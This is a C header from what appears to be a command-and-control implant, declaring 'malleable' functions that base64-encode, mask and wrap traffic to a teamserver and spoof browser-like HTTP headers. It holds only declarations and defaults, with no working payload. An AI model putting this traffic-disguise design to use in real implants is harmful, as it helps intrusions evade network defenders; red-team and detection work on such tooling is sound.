#ifndef JAGER_MALLEABLE_H
#define JAGER_MALLEABLE_H

#include <windows.h>
#include "config.h"

// Compile-time malleable wire transform flags (set via build_implant.py -D)
#ifndef MALLEABLE_OUT_BASE64
#define MALLEABLE_OUT_BASE64 0
#endif
#ifndef MALLEABLE_IN_BASE64
#define MALLEABLE_IN_BASE64 0
#endif
#ifndef MALLEABLE_OUT_PREPEND
#define MALLEABLE_OUT_PREPEND ""
#endif
#ifndef MALLEABLE_OUT_APPEND
#define MALLEABLE_OUT_APPEND ""
#endif
#ifndef MALLEABLE_IN_PREPEND
#define MALLEABLE_IN_PREPEND ""
#endif
#ifndef MALLEABLE_IN_APPEND
#define MALLEABLE_IN_APPEND ""
#endif
#ifndef MALLEABLE_MASK_KEY
#define MALLEABLE_MASK_KEY 0
#endif
#ifndef HTTP_HDR_ACCEPT
#define HTTP_HDR_ACCEPT "application/json, text/plain, */*"
#endif
#ifndef HTTP_HDR_ACCEPT_LANGUAGE
#define HTTP_HDR_ACCEPT_LANGUAGE "en-US,en;q=0.9"
#endif

// Encode plaintext JSON before POST (operator -> teamserver direction on implant)
DWORD malleable_encode_outbound(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_cap);

// Decode response body from teamserver before JSON parse
DWORD malleable_decode_inbound(const BYTE *in, DWORD in_len, BYTE *out, DWORD out_cap);

// Build extra WinHTTP headers from profile
void malleable_build_headers(wchar_t *buf, DWORD buf_chars);

#endif
